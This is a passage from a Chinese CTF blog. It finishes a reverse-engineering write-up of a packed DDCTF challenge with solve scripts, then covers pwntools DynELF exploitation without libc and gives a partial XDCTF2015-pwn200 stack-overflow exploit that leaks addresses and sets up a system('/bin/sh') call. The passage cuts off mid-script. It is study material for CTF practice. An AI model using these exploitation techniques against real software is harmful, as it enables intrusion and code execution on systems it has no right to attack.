<p>至此已找到主函数的入口，OEP也已经找到。在执行到原程序入口点后，外壳程序已经将原程序的各个段以及导入表等数据都恢复完成。为了能够调试分析程序，我们需要使用内存dump工具，把程序导出</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/XMAN-2019-FZU/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-08%20%E4%B8%8B%E5%8D%884.02.41.png" alt></p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/XMAN-2019-FZU/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-08%20%E4%B8%8B%E5%8D%884.02.58.png" alt></p>
<p>这里我们直接获取<code>EIP</code>作为<code>OEP</code>即可，我们也需要注意记住<code>OEP</code>的值<code>1B98</code>在接下来的恢复导入表的时候有用。现在我们来恢复导入表，首先我们启动原程序，让<strong>Imp Rec</strong>工具抓取到它的进程</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/XMAN-2019-FZU/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-08%20%E4%B8%8B%E5%8D%884.03.54.png" alt></p>
<p>现在我们要做的就是，输入我们之前获得的<code>OEP</code>，然后执行<strong>自动查找IAT</strong>和<strong>获取输入表</strong>，然后<strong>转储到文件</strong>，文件即为我们之前<code>dump</code>出的主程序</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/XMAN-2019-FZU/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-08%20%E4%B8%8B%E5%8D%884.04.08.png" alt></p>
<p>到这里为止我们的所有脱壳项目已经完成，用IDA Pro打开我们的脱壳程序，可以发现导入表也已经调用成功，反汇编代码也比较正常了，我们可以很快的找到main函数</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/XMAN-2019-FZU/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-08%20%E4%B8%8B%E5%8D%884.05.57.png" alt></p>
<h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><p>发现我们输入的字符串被程序加密后与“<code>DDCTF{reverseME}</code>”作比较；也就是flag输入进去之后会被程序加密为“<code>DDCTF{reverseME}</code>”；将其拉入ida分析很明显，<code>sub_401240</code>函数便是加密函数；进入内部查看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __usercall sub_401240@&lt;eax&gt;(<span class="keyword">const</span> <span class="keyword">char</span> *a1@&lt;esi&gt;, <span class="keyword">int</span> a2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// bl</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [esp+Bh] [ebp-405h]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [esp+Ch] [ebp-404h]</span></span><br><span class="line">  <span class="keyword">char</span> Dst; <span class="comment">// [esp+Dh] [ebp-403h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">0x3FF</span>u);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = v9;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v5 = a1[v3];</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(a1[v3] - <span class="number">48</span>) &gt; <span class="number">9u</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(v5 - <span class="number">65</span>) &lt;= <span class="number">5u</span> )</span><br><span class="line">          v9 = v5 - <span class="number">55</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v9 = a1[v3] - <span class="number">48</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v6 = a1[v3 + <span class="number">1</span>];</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(a1[v3 + <span class="number">1</span>] - <span class="number">48</span>) &gt; <span class="number">9u</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(v6 - <span class="number">65</span>) &lt;= <span class="number">5u</span> )</span><br><span class="line">          v4 = v6 - <span class="number">55</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v4 = a1[v3 + <span class="number">1</span>] - <span class="number">48</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v7 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3 &gt;&gt; <span class="number">1</span>;</span><br><span class="line">      v3 += <span class="number">2</span>;</span><br><span class="line">      *(&amp;v10 + v7) = v4 | <span class="number">16</span> * v9;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v3 &lt; v2 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sub_401000(v2 / <span class="number">2</span>, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可知程序为一个加密算法。将所输入的字符串的每个字符分别与<code>0x402FF8</code>相加，在此处所对应的字符即为加密后的新字符。写一个小脚本，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[]=<span class="string">"1~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]1[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)("</span>;</span><br><span class="line">    <span class="keyword">char</span> b[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> c[]=<span class="string">"DDCTF&#123;reverseME&#125;"</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">16</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> n=<span class="string">'!'</span>;n&lt;<span class="number">126</span>;n++)</span><br><span class="line">        &#123;</span><br><span class="line">            b[i]=a[(<span class="keyword">int</span>)n<span class="number">-31</span>];</span><br><span class="line">            <span class="keyword">if</span>(b[i]==c[i])</span><br><span class="line">             &#123;</span><br><span class="line">                 <span class="built_in">cout</span>&lt;&lt;n;</span><br><span class="line">                 <span class="keyword">break</span>;</span><br><span class="line">             &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>或者Python脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">table = [<span class="number">00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xFF</span>,<span class="number">0x3A</span>,<span class="number">0xFC</span>,<span class="number">0x30</span>,<span class="number">0x00</span>,<span class="number">0xC5</span>,<span class="number">0x03</span>,<span class="number">0xCF</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0xFE</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x7E</span>,<span class="number">0x7D</span>,<span class="number">0x7C</span>,<span class="number">0x7B</span>,<span class="number">0x7A</span>,<span class="number">0x79</span>,<span class="number">0x78</span>,<span class="number">0x77</span>,<span class="number">0x76</span>,<span class="number">0x75</span>,<span class="number">0x74</span>,<span class="number">0x73</span>,<span class="number">0x72</span>,<span class="number">0x71</span>,<span class="number">0x70</span>,<span class="number">0x6F</span>,<span class="number">0x6E</span>,<span class="number">0x6D</span>,<span class="number">0x6C</span>,<span class="number">0x6B</span>,<span class="number">0x6A</span>,<span class="number">0x69</span>,<span class="number">0x68</span>,<span class="number">0x67</span>,<span class="number">0x66</span>,<span class="number">0x65</span>,<span class="number">0x64</span>,<span class="number">0x63</span>,<span class="number">0x62</span>,<span class="number">0x61</span>,<span class="number">0x60</span>,<span class="number">0x5F</span>,<span class="number">0x5E</span>,<span class="number">0x5D</span>,<span class="number">0x5C</span>,<span class="number">0x5B</span>,<span class="number">0x5A</span>,<span class="number">0x59</span>,<span class="number">0x58</span>,<span class="number">0x57</span>,<span class="number">0x56</span>,<span class="number">0x55</span>,<span class="number">0x54</span>,<span class="number">0x53</span>,<span class="number">0x52</span>,<span class="number">0x51</span>,<span class="number">0x50</span>,<span class="number">0x4F</span>,<span class="number">0x4E</span>,<span class="number">0x4D</span>,<span class="number">0x4C</span>,<span class="number">0x4B</span>,<span class="number">0x4A</span>,<span class="number">0x49</span>,<span class="number">0x48</span>,<span class="number">0x47</span>,<span class="number">0x46</span>,<span class="number">0x45</span>,<span class="number">0x44</span>,<span class="number">0x43</span>,<span class="number">0x42</span>,<span class="number">0x41</span>,<span class="number">0x40</span>,<span class="number">0x3F</span>,<span class="number">0x3E</span>,<span class="number">0x3D</span>,<span class="number">0x3C</span>,<span class="number">0x3B</span>,<span class="number">0x3A</span>,<span class="number">0x39</span>,<span class="number">0x38</span>,<span class="number">0x37</span>,<span class="number">0x36</span>,<span class="number">0x35</span>,<span class="number">0x34</span>,<span class="number">0x33</span>,<span class="number">0x32</span>,<span class="number">0x31</span>,<span class="number">0x30</span>,<span class="number">0x2F</span>,<span class="number">0x2E</span>,<span class="number">0x2D</span>,<span class="number">0x2C</span>,<span class="number">0x2B</span>,<span class="number">0x2A</span>,<span class="number">0x29</span>,<span class="number">0x28</span>,<span class="number">0x27</span>,<span class="number">0x26</span>,<span class="number">0x25</span>,<span class="number">0x24</span>,<span class="number">0x23</span>,<span class="number">0x22</span>,<span class="number">0x21</span>,<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x70</span>,<span class="number">0x19</span>,<span class="number">0x38</span>,<span class="number">0x00</span>,<span class="number">0x80</span>,<span class="number">0x12</span>,<span class="number">0x38</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">str1 = <span class="string">"DDCTF&#123;reverseME&#125;"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">    flag += chr(table.index(ord(str1[i])))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>


        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/06/╜Φ╓·DynELF╩╡╧╓╬▐libc╡─┬⌐╢┤└√╙├╨í╜ß/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/08/06/╜Φ╓·DynELF╩╡╧╓╬▐libc╡─┬⌐╢┤└√╙├╨í╜ß/" class="post-title-link" itemprop="url">借助DynELF实现无libc的漏洞利用小结</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-08-06 07:46:47 / Modified: 22:47:28" itemprop="dateCreated datePublished" datetime="2019-08-06T07:46:47-07:00">2019-08-06</time>
            </span>
          
            

            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>前言</strong></p>
<p>在没有目标系统libc文件的情况下，我们可以使用pwntools的DynELF模块来泄漏地址信息，从而获取到shell。本文针对linux下的puts和write，分别给出了实现DynELF关键函数leak的方法，并通过3道CTF题目介绍了这些方法的具体应用情况。</p>
<p><strong>DynELF</strong></p>
<p>DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块，其基本代码框架如下。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">'./xxx'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">  <span class="comment">#各种预处理</span></span><br><span class="line">  payload = <span class="string">"xxxxxxxx"</span> + address + <span class="string">"xxxxxxxx"</span></span><br><span class="line">  p.send(payload)</span><br><span class="line">  <span class="comment">#各种处理</span></span><br><span class="line">  data = p.recv(<span class="number">4</span>)</span><br><span class="line">  log.debug(<span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">"./xxx"</span>))      <span class="comment">#初始化DynELF模块 </span></span><br><span class="line">systemAddress = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)  <span class="comment">#在libc文件中搜索system函数的地址</span></span><br></pre></td></tr></table></figure>

<p>需要使用者进行的工作主要集中在leak函数的具体实现上，上面的代码只是个模板。其中，address就是leak函数要泄漏信息的所在地址，而payload就是触发目标程序泄漏address处信息的攻击代码。</p>
<p><strong>使用条件</strong></p>
<p>不管有没有libc文件，要想获得目标系统的system函数地址，首先都要求目标二进制程序中存在一个能够泄漏目标系统内存中libc空间内信息的漏洞。同时，由于我们是在对方内存中不断搜索地址信息，故我们需要这样的信息泄露漏洞能够被反复调用。以下是大致归纳的主要使用条件：</p>
<p><strong>1）目标程序存在可以泄露libc空间信息的漏洞，如read@got就指向libc地址空间内；</strong></p>
<p><strong>2）目标程序中存在的信息泄露漏洞能够反复触发，从而可以不断泄露libc地址空间内的信息。</strong></p>
<p>当然，以上仅仅是实现利用的基本条件，不同的目标程序和运行环境都会有一些坑需要绕过。接下来，我们主要针对write和puts这两个普遍用来泄漏信息的函数在实际配合DynELF工作时可能遇到的问题，给出相应的解决方法。</p>
<p><strong>write函数</strong></p>
<p>write函数原型是write(fd, addr, len)，即将addr作为起始地址，读取len字节的数据到文件流fd（0表示标准输入流stdin、1表示标准输出流stdout）。write函数的优点是可以读取任意长度的内存信息，即它的打印长度只受len参数控制，缺点是需要传递3个参数，特别是在x64环境下，可能会带来一些困扰。</p>
<p>在x64环境下，函数的参数是通过寄存器传递的，rdi对应第一个参数，rsi对应第二个参数，rdx对应第三个参数，往往凑不出类似“pop rdi; ret”、“pop rsi; ret”、“pop  rdx; ret”等3个传参的gadget。此时，可以考虑使用<strong>libc_csu_init函数的通用gadget，具体原理请参见<a href="http://www.cnblogs.com/Ox9A82/p/5487725.html" target="_blank" rel="noopener">文章</a>。简单的说，就是通过</strong>libc_csu_init函数的两段代码来实现3个参数的传递，这两段代码普遍存在于x64二进制程序中，只不过是间接地传递参数，而不像原来，是通过pop指令直接传递参数。</p>
<p>第一段代码如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040075A   pop  rbx  #需置为0，为配合第二段代码的call指令寻址</span><br><span class="line">.text:000000000040075B   pop  rbp  #需置为1</span><br><span class="line">.text:000000000040075C   pop  r12  #需置为要调用的函数地址，注意是got地址而不是plt地址，因为第二段代码中是call指令</span><br><span class="line">.text:000000000040075E   pop  r13  #write函数的第三个参数</span><br><span class="line">.text:0000000000400760   pop  r14  #write函数的第二个参数</span><br><span class="line">.text:0000000000400762   pop  r15  #write函数的第一个参数</span><br><span class="line">.text:0000000000400764   retn</span><br></pre></td></tr></table></figure>

<p>第二段代码如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400740   mov  rdx, r13</span><br><span class="line">.text:0000000000400743   mov  rsi, r14</span><br><span class="line">.text:0000000000400746   mov  edi, r15d</span><br><span class="line">.text:0000000000400749   call  qword ptr [r12+rbx*8]</span><br></pre></td></tr></table></figure>

<p>这两段代码运行后，会将栈顶指针移动56字节，我们在栈中布置56个字节即可。</p>
<p>这样，我们便解决了write函数在leak信息中存在的问题，具体的应用会放到后面的3道题目中讲。</p>
<p><strong>puts函数</strong></p>
<p>puts的原型是puts(addr)，即将addr作为起始地址输出字符串，直到遇到“x00”字符为止。也就是说，puts函数输出的数据长度是不受控的，只要我们输出的信息中包含x00截断符，输出就会终止，且会自动将“n”追加到输出字符串的末尾，这是puts函数的缺点，而优点就是需要的参数少，只有1个，无论在x32还是x64环境下，都容易调用。</p>
<p>为了克服输入不受控这一缺点，我们考虑利用puts函数输出的字符串最后一位为“n“这一特点，分两种情况来解决。</p>
<p><strong>（1）puts输出完后就没有其他输出</strong>，在这种情况下的leak函数可以这么写。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line">  data = <span class="string">''</span></span><br><span class="line">  payload = xxx</span><br><span class="line">  p.send(payload)</span><br><span class="line">  <span class="keyword">print</span> p.recvuntil(<span class="string">'xxxn'</span>) <span class="comment">#一定要在puts前释放完输出</span></span><br><span class="line">  up = <span class="string">""</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment">#由于接收完标志字符串结束的回车符后，就没有其他输出了，故先等待1秒钟，如果确实接收不到了，就说明输出结束了</span></span><br><span class="line">    <span class="comment">#以便与不是标志字符串结束的回车符（0x0A）混淆，这也利用了recv函数的timeout参数，即当timeout结束后仍得不到输出，则直接返回空字符串””</span></span><br><span class="line">    c = p.recv(numb=<span class="number">1</span>, timeout=<span class="number">1</span>)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">'n'</span> <span class="keyword">and</span> c == <span class="string">""</span>:  <span class="comment">#接收到的上一个字符为回车符，而当前接收不到新字符，则</span></span><br><span class="line">      buf = buf[:<span class="number">-1</span>]             <span class="comment">#删除puts函数输出的末尾回车符</span></span><br><span class="line">      buf += <span class="string">"x00"</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      buf += c</span><br><span class="line">    up = c</span><br><span class="line">  data = buf[:<span class="number">4</span>]  <span class="comment">#取指定字节数</span></span><br><span class="line">  log.info(<span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">  <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>

<p><strong>（2）puts输出完后还有其他输出</strong>，在这种情况下的leak函数可以这么写。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line">  data = <span class="string">""</span></span><br><span class="line">  payload = xxx</span><br><span class="line">  p.send(payload)</span><br><span class="line">  <span class="keyword">print</span> p.recvuntil(<span class="string">"xxxn"</span>)) <span class="comment">#一定要在puts前释放完输出</span></span><br><span class="line">  up = <span class="string">""</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c = p.recv(<span class="number">1</span>)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">'n'</span> <span class="keyword">and</span> c == <span class="string">"x"</span>:  <span class="comment">#一定要找到泄漏信息的字符串特征</span></span><br><span class="line">      data = buf[:<span class="number">-1</span>]                     </span><br><span class="line">      data += <span class="string">"x00"</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      buf += c</span><br><span class="line">    up = c</span><br><span class="line">  data = buf[:<span class="number">4</span>] </span><br><span class="line">  log.info(<span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">  <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>

<p><strong>其他需要注意的地址</strong></p>
<p>在信息泄露过程中，由于循环制造溢出，故可能会导致栈结构发生不可预料的变化，可以尝试调用目标二进制程序的_start函数来重新开始程序以恢复栈。</p>
<p><strong>XDCTF2015-pwn200</strong></p>
<p>本题是32位linux下的二进制程序，无cookie，存在很明显的栈溢出漏洞，且可以循环泄露，符合我们使用DynELF的条件。具体的栈溢出位置等调试过程就不细说了，只简要说一下<strong>借助DynELF实现利用的要点：</strong></p>
<p> 1）调用write函数来泄露地址信息，比较方便；</p>
<p> 2）32位linux下可以通过布置栈空间来构造函数参数，不用找gadget，比较方便；</p>
<p> 3）在泄露完函数地址后，需要重新调用一下_start函数，用以恢复栈；</p>
<p> 4）在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress，可以使用ropper或ROPgadget来完成。</p>
<p>接下来就直接给出利用代码。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">p = process(<span class="string">"./xdctf-pwn200"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./xdctf-pwn200"</span>)</span><br><span class="line">writeplt = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">writegot = elf.got[<span class="string">'write'</span>]</span><br><span class="line">readplt = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">readgot = elf.got[<span class="string">'read'</span>]</span><br><span class="line">vulnaddress =  <span class="number">0x08048484</span> </span><br><span class="line">startaddress = <span class="number">0x080483d0</span>      <span class="comment">#调用start函数，用以恢复栈</span></span><br><span class="line">bssaddress =   <span class="number">0x0804a020</span>    <span class="comment">#用来写入“/bin/sh”字符串</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">  payload = <span class="string">"A"</span> * <span class="number">112</span></span><br><span class="line">  payload += p32(writeplt)</span><br><span class="line">  payload += p32(vulnaddress)</span><br><span class="line">  payload += p32(<span class="number">1</span>)</span><br><span class="line">  payload += p32(address)</span><br><span class="line">  payload += p32(<span class="number">4</span>)</span><br><span class="line">  p.send(payload)</span><br><span class="line">  data = p.recv(<span class="number">4</span>)</span><br><span class="line">  <span class="keyword">print</span> <span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line"><span class="keyword">print</span> p.recvline()</span><br><span class="line">dynelf = DynELF(leak, elf=ELF(<span class="string">"./lctf-pwn200"</span>))</span><br><span class="line">systemAddress = dynelf.lookup(<span class="string">"__libc_system"</span>, <span class="string">"libc"</span>) </span><br><span class="line"><span class="keyword">print</span> <span class="string">"systemAddress:"</span>, hex(systemAddress)</span><br><span class="line"><span class="comment">#调用_start函数，恢复栈</span></span><br><span class="line">payload1 = <span class="string">"A"</span> * <span class="number">112</span></span><br><span class="line">payload1 += p32(startaddress) </span><br><span class="line">p.send(payload1)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">ppprAddress = <span class="number">0x0804856c</span>  <span class="comment">#获取到的连续3次pop操作的gadget的地址 </span></span><br><span class="line">payload1 = <span class="string">"A"</span> * <span class="number">112</span></span><br><span class="line">payload1 += p32(readplt)</span><br><span class="line">payload1 += p32(ppprAddress)</span><br><span class="line">payload1 += p32(<span class="number">0</span>)</span><br><span 